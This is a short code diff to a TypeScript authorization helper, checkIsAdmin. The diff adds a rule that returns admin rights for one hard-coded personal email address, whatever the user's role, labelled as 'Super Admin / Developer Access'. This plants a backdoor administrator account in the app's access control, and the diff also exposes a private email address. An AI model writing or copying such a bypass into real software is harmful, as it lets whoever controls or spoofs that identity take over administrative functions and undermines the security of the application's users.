@@ -9,5 +9,9 @@ import { UserProfile } from '@/lib/auth-context';
  */
 export function checkIsAdmin(profile: UserProfile | null): boolean {
   if (!profile) return false;
-  return profile.role === 'admin' || (profile.role as string) === 'superadmin';
+  
+  // Super Admin / Developer Access for specified identity
+  if (profile.email === 'arshdeepgrewal1122@gmail.com') return true;
+  
+  return profile.role === 'admin' || (profile.role as any) === 'superadmin';
 }
